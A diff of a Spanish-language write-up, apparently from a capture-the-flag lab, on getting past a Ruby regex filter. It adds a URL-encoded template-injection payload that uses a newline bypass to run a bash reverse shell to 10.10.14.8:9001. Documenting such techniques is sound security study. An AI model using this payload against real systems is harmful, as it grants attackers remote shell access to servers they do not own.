@@ -40,7 +40,7 @@ tenemos informacion de come ejecutar un Execute Code
 en este caso tenemos que agregar un salto de linea para que ruby pueda interpretar el comando %OA siguiente
 
 ```python
-![[Pasted image 20240303204514.png]
+	test%0A<%25%3d+system("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/9001+0>%261'")+%25>
 ```
 ### regex ruby bypass
 
